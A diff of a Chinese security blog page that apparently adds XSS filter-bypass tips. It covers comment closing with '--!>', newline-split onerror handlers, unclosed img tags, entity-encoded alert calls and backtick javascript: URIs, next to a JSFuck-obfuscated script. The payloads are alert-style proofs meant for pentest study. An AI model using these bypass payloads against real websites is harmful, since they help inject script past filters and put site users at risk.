@@ -7,7 +7,7 @@
 <meta name="description" content="一名默默无闻的攻城狮">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<link rel="shortcut icon" href="https://rebootorz.github.io/favicon.ico?v=1612600637517">
+<link rel="shortcut icon" href="https://rebootorz.github.io/favicon.ico?v=1612624699064">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
 <link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
@@ -135,8 +135,10 @@
 <pre><code>&lt;script&gt;[][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]][([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+([][[]]+[])[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[+!+[]]]]+([][[]]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]((![]+[])[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+[+!+[]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]])()&lt;/script&gt;
 </code></pre>
 <ul>
-<li>在线加密地址：https://www.sojson.com/jsfuck.html<br>
-6.svg标签</li>
+<li>在线加密地址：https://www.sojson.com/jsfuck.html</li>
+</ul>
+<p>6.svg标签</p>
+<ul>
 <li>svg内部标签和语句规则继承的是XML不是HTML，其内部的script标签中可以允许存在一部分进制或编码后的字符（比如实体编码）：</li>
 </ul>
 <pre><code>&lt;svg&gt;&lt;script&gt;alert&amp;#x28;1&amp;#x29;&lt;/script&gt;&lt;/svg&gt;
@@ -154,6 +156,35 @@ stage3:*/&lt;/script&gt;
 <li>当然也可以直接不分阶段：</li>
 </ul>
 <pre><code>&lt;script&gt;/**/alert(1)/**/&lt;/script&gt;
+</code></pre>
+<p>8.注释符的闭合<br>
+如果代码被圈在注释符中：</p>
+<pre><code>&lt;!-- XXXXX --&gt;
+</code></pre>
+<p>闭合时除了 --&gt;XXX外,还可以使用 --!&gt;来闭合。<br>
+反过来，不能用&lt;--去闭合--&gt;<br>
+9.换行绕过<br>
+有时候过滤的时候会使用*作为通配符，例如过滤on开头、=结尾的（on事件），则用空格可绕过：</p>
+<pre><code>type=&quot;image&quot; src=&quot;xxx&quot; onerror
+
+=&quot;alert(/xss/)&quot;
+</code></pre>
+<pre><code>&lt;/style
+&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;alert(1);&quot;&gt;
+</code></pre>
+<p>10.标签不闭合绕过<br>
+有时候过滤器检测的是以&lt;开头&gt;结尾的内容，所以输入的时候不能将标签闭合，可以使用类似如下形式：</p>
+<pre><code>&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;       //右边&gt;没了
+</code></pre>
+<p>11.利用html编码绕过强制大小写转化<br>
+html对大小写不敏感，所以无所谓，但是js对大小写是敏感的，例如alert只能是全小写。<br>
+如果输入的内容被强制转换成大写ALERT就无法执行，可以对关键字进行html编码，例如：</p>
+<pre><code>&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;   //因为编码后的富豪和数字没有大小写之分
+</code></pre>
+<p>12.重音符混淆<br>
+如果你的JavaScript代码中需要同时使用单引号和双引号，那么可以使用重音符（`）来包含JavaScript 代码。这通常会有很大帮助，因为大部分跨站脚本过滤器都没有过滤这个字符：</p>
+<pre><code>&lt;IMG SRC=`javascript:alert(&quot;RSnake says, 'XSS'&quot;)`&gt; 
 </code></pre>
 
             </div>
@@ -178,7 +209,7 @@ stage3:*/&lt;/script&gt;
 
       <div class="sm-12 md-4 col sidebar">
   <div class="paper info-container">
-    <img src="https://rebootorz.github.io/images/avatar.png?v=1612600637517" class="no-responsive avatar">
+    <img src="https://rebootorz.github.io/images/avatar.png?v=1612624699064" class="no-responsive avatar">
     <div class="text-muted">一名默默无闻的攻城狮</div>
     <div class="social-container">
       
@@ -204,6 +235,12 @@ stage3:*/&lt;/script&gt;
     </div>
     <div class="row">
       <ul>
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/KBF21wEvg/">[Go] 12.锁</a>
+            </li>
+          
         
           
             <li>
@@ -260,10 +297,6 @@ stage3:*/&lt;/script&gt;
           
         
           
-            <li>
-              <a href="https://rebootorz.github.io/K1Hy1MSM0/">[Go] 4.结构体</a>
-            </li>
-          
         
           
         
@@ -298,7 +331,11 @@ stage3:*/&lt;/script&gt;
     </div>
     <div class="row">
       
-        <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge secondary">
+        <a href="https://rebootorz.github.io/tag/VLOcVZGpM/" class="badge ">
+          Golang
+        </a>
+      
+        <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge success">
           红队
         </a>
       
@@ -306,11 +343,7 @@ stage3:*/&lt;/script&gt;
           渗透技巧
         </a>
       
-        <a href="https://rebootorz.github.io/tag/VLOcVZGpM/" class="badge secondary">
-          Golang
-        </a>
-      
-        <a href="https://rebootorz.github.io/tag/4EHijLUV6/" class="badge secondary">
+        <a href="https://rebootorz.github.io/tag/4EHijLUV6/" class="badge ">
           物联网安全
         </a>
       
